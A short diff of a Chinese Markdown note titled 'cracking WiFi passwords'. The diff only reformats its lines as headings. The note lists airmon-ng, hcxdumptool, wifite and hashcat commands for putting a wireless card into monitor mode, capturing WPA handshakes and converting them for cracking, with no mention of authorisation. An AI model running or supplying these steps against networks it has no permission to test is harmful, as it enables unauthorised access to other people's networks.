@@ -1,10 +1,11 @@
 # 破解WIFI密码
 
-VMWARE-虚拟机-连接网卡
-sudu su
-airmon-ng #查看网卡
-sudo airmon-ng check kill #关闭干扰进程
-sudo apt install hcxdumptool hcxtools -y #安装必要组件
-sudo airmon-ng start wlan0 #开始监听
-sudo wifite --no-wps --wpa -5 #直接进行抓包
-https://hashcat.net/cap2hashcat/ #转换PCAPNG，PCAP或CAP文件
+### VMWARE-虚拟机-连接网卡
+### sudu su
+### airmon-ng #查看网卡
+### sudo airmon-ng check kill #关闭干扰进程
+### sudo apt install hcxdumptool hcxtools -y #安装必要组件
+### sudo airmon-ng start wlan0 #开始监听
+### sudo wifite --no-wps --wpa -5 #直接进行抓包
+### https://hashcat.net/cap2hashcat/ #转换PCAPNG，PCAP或CAP文件
+### 
